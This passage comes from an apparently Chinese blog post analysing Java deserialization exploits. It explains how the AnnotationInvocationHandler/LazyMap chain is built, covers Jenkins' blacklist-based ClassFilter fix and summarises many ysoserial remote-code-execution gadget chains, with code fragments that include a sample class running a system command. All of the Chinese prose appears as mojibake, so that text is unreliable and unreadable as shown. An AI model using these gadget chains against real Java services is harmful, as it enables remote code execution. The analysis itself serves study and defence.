memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨éå†<code>memberValues.entrySet()</code>æ—¶ï¼Œä¼šç”¨é”®ååœ¨<code>memberTypes</code>ä¸­å°è¯•è·å–ä¸€ä¸ª<code>Class</code>ï¼Œå¹¶åˆ¤æ–­å®ƒæ˜¯å¦ä¸º<code>null</code>ï¼Œè¿™å°±æ˜¯åˆšæ‰è¯´çš„éœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚æ¥ä¸‹æ¥æ˜¯ç½‘ä¸Šå¾ˆå°‘æåˆ°è¿‡çš„ä¸€ä¸ªç»“è®ºï¼š</p>
<p>é¦–å…ˆï¼Œ<code>memberTypes</code>æ˜¯<code>AnnotationType</code>çš„ä¸€ä¸ªå­—æ®µï¼Œé‡Œé¢å­˜å‚¨ç€<code>Annotation</code>æ¥å£å£°æ˜çš„æ–¹æ³•ä¿¡æ¯ <em>ï¼ˆé”®åä¸ºæ–¹æ³•åï¼Œå€¼ä¸ºæ–¹æ³•è¿”å›ç±»å‹ï¼‰</em> ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨è·å–<code>AnnotationInvocationHandler</code>å®ä¾‹æ—¶ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªæ–¹æ³•ä¸ªæ•°å¤§äº0çš„<code>Annotation</code>å­ç±» <em>ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œè‹¥æ–¹æ³•ä¸ªæ•°å¤§äº0ï¼Œéƒ½ä¼šåŒ…å«ä¸€ä¸ªåä¸º<code>value</code>çš„æ–¹æ³•ï¼‰</em> ï¼Œå¹¶ä¸”åŸå§‹<code>Map</code>ä¸­å¿…é¡»å­˜åœ¨ä»»æ„ä»¥è¿™äº›æ–¹æ³•åä¸ºé”®åçš„å…ƒç´ ï¼Œä¸”å…ƒç´ å€¼ä¸æ˜¯è¯¥æ–¹æ³•è¿”å›ç±»å‹çš„å®ä¾‹ï¼Œæ‰èƒ½é¡ºåˆ©è¿›å…¥<code>setValue()</code>çš„æµç¨‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">m</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ä¸Šæ˜¯<code>TransformedMap</code>çš„åˆ©ç”¨æ„é€ è¿‡ç¨‹ã€‚è€Œysoserialå®˜æ–¹æ›´å€¾å‘äºä½¿ç”¨<code>LazyMap</code>ä½œä¸ºè£…é¥°å™¨ï¼Œå®ƒåœ¨è£…é¥°æ—¶ä¼šä¼ å…¥åŸå§‹<code>Map</code>å’Œä¸€ä¸ª<code>Transformer</code>ä½œä¸ºå·¥å‚ï¼Œå½“<code>get()</code>è·å–å€¼æ—¶ï¼Œè‹¥é”®ä¸å­˜åœ¨ï¼Œå°±ä¼šè°ƒç”¨å·¥å‚çš„<code>transform()</code>åˆ›å»ºä¸€ä¸ªæ–°å€¼æ”¾å…¥<code>Map</code>ä¸­ï¼Œå› æ­¤è£…é¥°ä»»æ„ä¸€ä¸ªç©º<code>Map</code>ä¹Ÿå¯ä»¥æ»¡è¶³éœ€æ±‚ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map m = LazyMap.decorate(<span class="keyword">new</span> HashMap(), chain);</span><br></pre></td></tr></table></figure></div>

<p>ä½†ä¸<code>TransformedMap</code>ä¸åŒçš„æ˜¯ï¼Œ<code>AnnotationInvocationHandler.readObject()</code>ä¸­å¹¶æ²¡æœ‰ç›´æ¥çš„å¯¹<code>memberTypes</code>æ‰§è¡Œ<code>get()</code>æ“ä½œï¼Œåè€Œæ˜¯åœ¨å®ƒçš„<code>invoke()</code>ä¸­å­˜åœ¨<code>get()</code>ï¼Œä½†åˆå¯¹æ–¹æ³•åæœ‰ä¸€å®šçš„è¦æ±‚ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">        return equalsImpl(args[0]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"toString"</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"hashCode"</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"annotationType"</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥ï¼Œysoserialä½¿ç”¨JavaåŠ¨æ€ä»£ç†çš„æ–¹å¼å¤„ç†äº† <code>LazyMap</code> ï¼Œä½¿ <code>readObject()</code>åœ¨è°ƒç”¨<code>memberValues.entrySet()</code> æ—¶ä»£ç†è¿›å…¥<code>AnnotationInvocationHandler.invoke()</code>é˜¶æ®µï¼Œåˆšå¥½æ–¹æ³•å<code>entrySet</code>ä¹Ÿå¯ä»¥é¡ºåˆ©çš„è·³è¿‡å‰é¢çš„å‡ ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œæœ€ç»ˆè¾¾åˆ°ç›®çš„ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆPayloadä¸­ä¼šåŒ…å«ä¸¤ä¸ª<code>AnnotationInvocationHandler</code>çš„åŸå› ã€‚</p>
<hr>
<h2 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h2><p>Jenkinsåœ¨1.638ç‰ˆæœ¬çš„ <code>Connection.readObject()</code> ä¸­ï¼Œå°†é»˜è®¤çš„<code>ObjectInputStream</code>æ”¹ä¸ºäº†å…¶è‡ªå®šä¹‰çš„å­ç±»<code>ObjectInputStreamEx</code>ï¼Œå¹¶ä¼ å…¥<code>ClassFilter.DEFAULT</code>æ ¡éªŒè¿‡æ»¤ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStreamEx(in,</span><br><span class="line">            getClass().getClassLoader(), ClassFilter.DEFAULT);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ClassFilter.DEFAULT</code> é•¿è¿™æ ·ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ClassFilter DEFAULT = <span class="keyword">new</span> ClassFilter() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isBlacklisted</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">"org.codehaus.groovy.runtime."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.startsWith(<span class="string">"org.apache.commons.collections.functors."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name.contains(<span class="string">"org.apache.xalan"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>è¿˜æ˜¯ä¸€ä¸ªç®€ç®€å•å•çš„é»‘åå•ã€‚</p>
<h2 id="POPçš„è‰ºæœ¯"><a href="#POPçš„è‰ºæœ¯" class="headerlink" title="POPçš„è‰ºæœ¯"></a>POPçš„è‰ºæœ¯</h2><p>æ—¢ç„¶ååºåˆ—åŒ–æ¼æ´å¸¸è§çš„ä¿®å¤æ–¹æ¡ˆæ˜¯é»‘åå•ï¼Œå°±å­˜åœ¨è¢«ç»•è¿‡çš„é£é™©ï¼Œä¸€æ—¦å‡ºç°æ–°çš„POPé“¾ï¼ŒåŸæ¥çš„é˜²å¾¡ä¹Ÿå°±ç›´æ¥å®£å‘Šæ— æ•ˆäº†ã€‚</p>
<p>æ‰€ä»¥åœ¨ååºåˆ—åŒ–æ¼æ´çš„å¯¹æŠ—å²ä¸­ï¼Œé™¤äº†æœ‰å¤§ä½¬ä¸æ–­çš„æŒ–æ˜æ–°çš„ååºåˆ—åŒ–æ¼æ´ç‚¹ï¼Œæ›´æœ‰å¤§ç‰›ä¸æ–­çš„æ¢å¯»æ–°çš„POPé“¾ã€‚</p>
<p>POPå·²ç»æˆä¸ºååºåˆ—åŒ–åŒºåˆ«äºå…¶ä»–å¸¸è§„Webå®‰å…¨æ¼æ´çš„ä¸€é—¨ç‰¹æ®Šè‰ºæœ¯ã€‚</p>
<p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±ç”¨ysoserialè¿™ä¸ªé¡¹ç›®ï¼Œæ¥å¥½å¥½æ¢ç©¶ä¸€ä¸‹ç°åœ¨å¸¸ç”¨çš„è¿™äº›RCEç±»POPä¸­åˆ°åº•æœ‰ä»€ä¹ˆä¹¾å¤ï¼š</p>
<h3 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code> ååºåˆ—åŒ–æ‰€æœ‰å…ƒç´ åï¼Œé€šè¿‡<code>comparator.compare()</code>è¿›è¡Œæ’åºï¼Œè¯¥<code>comparator</code>è¢«ä»£ç†ç»™<code>XThis.Handler</code>å¤„ç†ï¼Œå…¶<code>invoke()</code>ä¼šè°ƒç”¨<code>This.invokeMethod()</code>ä»<code>Interpreter</code>è§£é‡Šå™¨ä¸­è§£æåŒ…å«æ¶æ„ä»£ç çš„<code>compare</code>æ–¹æ³•å¹¶æ‰§è¡Œ</p>
<h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>com.mchange.v2.c3p0.PoolBackedDataSource</code></p>
<p><code>PoolBackedDataSource.readObject()</code>è¿›è¡Œåˆ°çˆ¶ç±»<code>PoolBackedDataSourceBase.readObject()</code>é˜¶æ®µï¼Œä¼šè°ƒç”¨<code>ReferenceIndirector$ReferenceSerialized.getObject()</code>è·å–å¯¹è±¡ï¼Œå…¶ä¸­<code>InitialContext.lookup()</code>ä¼šå»åŠ è½½è¿œç¨‹æ¶æ„å¯¹è±¡å¹¶åˆå§‹åŒ–ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œæœ‰äº›åŒå­¦å¯èƒ½ä¸å¤ªæ¸…æ¥šè¿œç¨‹æ¶æ„å¯¹è±¡çš„é•¿ç›¸ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Malicious</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Malicious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>clojure.core$comp$fn__4727</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>ååºåˆ—åŒ–å„å…ƒç´ æ—¶ï¼Œé€šè¿‡å®ƒçš„<code>hashCode()</code>å¾—åˆ°hashå€¼ï¼Œè€Œ<code>AbstractTableModel$ff19274a.hashCode()</code>ä¼šä»<code>IPersistentMap</code>ä¸­å–<code>hashCode</code>é”®çš„å€¼å¯¹è±¡è°ƒç”¨å…¶<code>invoke()</code>ï¼Œæœ€ç»ˆå¯¼è‡´Clojure Shellå‘½ä»¤å­—ç¬¦ä¸²æ‰§è¡Œ</p>
<hr>
<h3 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>BeanComparator.compare()</code>ä¼šæ ¹æ®<code>BeanComparator.property</code> <em>ï¼ˆå€¼ä¸º<code>outputProperties</code>ï¼‰</em> è°ƒç”¨<code>TemplatesImpl.getOutputProperties()</code>ï¼Œå®ƒåœ¨<code>newTransformer()</code>æ—¶ä¼šåˆ›å»º<code>AbstractTranslet</code>å®ä¾‹ï¼Œå¯¼è‡´ç²¾å¿ƒæ„é€ çš„Javaå­—èŠ‚ç è¢«æ‰§è¡Œ</p>
<h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code><br>è§å‰æ–‡</p>
<h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>TransformingComparator.compare()</code>ä¼šè°ƒç”¨<code>InvokerTransformer.transform()</code>è½¬æ¢å…ƒç´ ï¼Œè¿›è€Œè·å–ç¬¬ä¸€ä¸ªå…ƒç´ <code>TemplatesImpl</code>çš„<code>newTransformer()</code>å¹¶è°ƒç”¨ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code></p>
<p>é™¤<code>Transformer</code>æ•°ç»„å…ƒç´ ç»„æˆä¸åŒå¤–ï¼Œä¸CommonsCollections1åŸºæœ¬ä¸€è‡´</p>
<h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>TransformingComparator.compare()</code>ä¼šè°ƒç”¨<code>ChainedTransformer.transform()</code>è½¬æ¢å…ƒç´ ï¼Œè¿›è€Œéå†æ‰§è¡Œ<code>Transformer</code>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>BadAttributeValueExpException</code></p>
<p><code>BadAttributeValueExpException.readObject()</code>å½“<code>System.getSecurityManager()</code>ä¸º<code>null</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>TiedMapEntry.toString()</code>ï¼Œå®ƒåœ¨<code>getValue()</code>æ—¶ä¼šé€šè¿‡<code>LazyMap.get()</code>å–å€¼ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashSet</code><br><code>HashSet.readObject()</code>ååºåˆ—åŒ–å„å…ƒç´ åï¼Œä¼šè°ƒç”¨<code>HashMap.put()</code>å°†ç»“æœæ”¾è¿›å»ï¼Œè€Œå®ƒé€šè¿‡<code>TiedMapEntry.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šè°ƒç”¨<code>getValue()</code>è§¦å‘<code>LazyMap.get()</code>å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<hr>
<h3 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.codehaus.groovy.runtime.MethodClosure</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code></p>
<p><code>AnnotationInvocationHandler.readObject()</code>åœ¨é€šè¿‡<code>memberValues.entrySet()</code>è·å–<code>Entry</code>é›†åˆï¼Œè¯¥<code>memberValues</code>è¢«ä»£ç†ç»™<code>ConvertedClosure</code>æ‹¦æˆª<code>entrySet</code>æ–¹æ³•ï¼Œæ ¹æ®<code>MethodClosure</code>çš„æ„é€ æœ€ç»ˆä¼šç”±<code>ProcessGroovyMethods.execute()</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<h3 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>é€šè¿‡<code>TypedValue.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œ<code>ComponentType.getPropertyValue()</code>ä¼šè°ƒç”¨<code>PojoComponentTuplizer.getPropertyValue()</code>è·å–åˆ°<code>TemplatesImpl.getOutputProperties</code>æ–¹æ³•å¹¶è°ƒç”¨å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>com.sun.rowset.JdbcRowSetImpl</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code><br>æ‰§è¡Œè¿‡ç¨‹ä¸Hibernate1ä¸€è‡´ï¼Œä½†Hibernate2å¹¶ä¸æ˜¯ä¼ å…¥<code>TemplatesImpl</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œæ˜¯åˆ©ç”¨<code>JdbcRowSetImpl.getDatabaseMetaData()</code>è°ƒç”¨<code>connect()</code>è¿æ¥åˆ°è¿œç¨‹RMI</p>
<hr>
<h3 id="JBossInterceptors1"><a href="#JBossInterceptors1" class="headerlink" title="JBossInterceptors1"></a>JBossInterceptors1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.jboss.interceptor.proxy.InterceptorMethodHandler</code></p>
<p><code>InterceptorMethodHandler.readObject()</code>åœ¨<code>executeInterception()</code>æ—¶ï¼Œä¼šæ ¹æ®<code>SimpleInterceptorMetadata</code>æ‹¿åˆ°<code>TemplatesImpl</code>æ”¾è¿›<code>ArrayList</code>ä¸­ï¼Œå¹¶ä¼ å…¥<code>SimpleInterceptionChain</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œå®ƒåœ¨è°ƒç”¨<code>invokeNextInterceptor()</code>æ—¶ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="JSON1"><a href="#JSON1" class="headerlink" title="JSON1"></a>JSON1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>å°†å„å…ƒç´ æ”¾è¿›<code>HashMap</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>TabularDataSupport.equals()</code>è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒçš„<code>JSONObject.containsValue()</code>è·å–å¯¹è±¡ååœ¨<code>PropertyUtils.getProperty()</code>å†…åŠ¨æ€è°ƒç”¨<code>getOutputProperties</code>æ–¹æ³•ï¼Œå®ƒè¢«ä»£ç†ç»™<code>CompositeInvocationHandlerImpl</code>ï¼Œå…¶ä¸­è½¬äº¤ç»™<code>JdkDynamicAopProxy.invoke()</code>ï¼Œåœ¨<code>AopUtils.invokeJoinpointUsingReflection()</code>æ—¶ä¼šä¼ å…¥ä»<code>AdvisedSupport.target</code>å­—æ®µä¸­å–å‡ºæ¥çš„<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="JavassistWeld1"><a href="#JavassistWeld1" class="headerlink" title="JavassistWeld1"></a>JavassistWeld1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code></p>
<p>é™¤JBosséƒ¨åˆ†åŒ…åå­˜åœ¨å·®å¼‚å¤–ï¼Œä¸JBossInterceptors1åŸºæœ¬ä¸€è‡´</p>
<h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>LinkedHashSet</code></p>
<p><code>LinkedHashSet.readObject()</code>å°†å„å…ƒç´ æ”¾è¿›<code>HashMap</code>æ—¶ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¼šè°ƒç”¨<code>equals()</code>ä¸ç¬¬ä¸€ä¸ªå…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒè¢«ä»£ç†ç»™<code>AnnotationInvocationHandler</code>è¿›å…¥<code>equalsImpl()</code>ï¼Œåœ¨<code>getMemberMethods()</code>éå†<code>TemplatesImpl</code>çš„æ–¹æ³•é‡åˆ°<code>getOutputProperties</code>è¿›è¡Œè°ƒç”¨æ—¶ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<hr>
<h3 id="MozillaRhino1"><a href="#MozillaRhino1" class="headerlink" title="MozillaRhino1"></a>MozillaRhino1</h3><p> <font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p> <font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>BadAttributeValueExpException</code></p>
<p> <code>BadAttributeValueExpException.readObject()</code>è°ƒç”¨<code>NativeError.toString()</code>æ—¶ï¼Œä¼šåœ¨<code>ScriptableObject.getProperty()</code>ä¸­è¿›å…¥<code>getImpl()</code>ï¼Œ<code>ScriptableObject$Slot</code>æ ¹æ®<code>name</code>è·å–åˆ°å°è£…äº†<code>Context.enter</code>æ–¹æ³•çš„<code>MemberBox</code>ï¼Œå¹¶é€šè¿‡å®ƒçš„<code>invoke()</code>å®Œæˆè°ƒç”¨ï¼Œè€Œä¹‹åæ ¹æ®<code>message</code>è°ƒç”¨<code>TemplatesImpl.newTransformer()</code>åˆ™ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>é€šè¿‡<code>ValueExpressionMethodExpression.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šç”±<code>getMethodExpression()</code>è°ƒç”¨<code>ValueExpression.getValue()</code>ï¼Œæœ€ç»ˆå¯¼è‡´ELè¡¨è¾¾å¼æ‰§è¡Œ</p>
<h3 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
